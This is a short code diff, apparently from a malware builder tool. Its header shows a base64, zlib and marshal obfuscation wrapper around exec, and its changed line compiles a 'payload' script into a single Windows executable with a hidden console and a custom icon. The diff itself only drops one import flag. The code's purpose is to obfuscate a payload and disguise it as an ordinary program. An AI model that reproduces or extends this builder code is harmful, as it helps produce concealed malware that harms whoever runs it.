@@ -235,7 +235,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
         try:
             if os_name == "Windows":
                 result = subprocess.run(
-                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hidden-import=pypiwin32 --hidden-import=audioop-lts --hidden-import=pycryptodome --hide-console hide-early {payload_file_name}.py"',
+                    f'docker run --platform linux/amd64 --env DISPLAY=$DISPLAY --volume "$(pwd):/src/" darkavengerreborn/pyinstaller-windows:latest "pyinstaller -F --onefile --windowed --icon=icon.ico --hidden-import=pypiwin32 --hidden-import=pycryptodome --hide-console hide-early {payload_file_name}.py"',
                     shell=True,
                     capture_output=True,
                 )
